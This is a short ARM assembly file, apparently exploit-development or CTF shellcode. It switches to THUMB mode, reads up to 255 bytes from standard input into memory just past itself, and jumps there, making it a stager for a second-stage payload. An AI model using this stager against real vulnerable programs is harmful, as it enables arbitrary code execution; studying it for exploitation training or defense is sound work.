.section .text
.global _start

_start:
    .code 32

    // Switching to THUMB mode
    add r3, pc, #1
    bx r3

    .code 16

    // read(0, &nextstage, &0xff)

    eor r0, r0, r0
    adr r1, nextstage
    mov r2, #0xff
    mov r7, #0x3 // SYS_read
    swi #1

    bx r1

    nextstage:
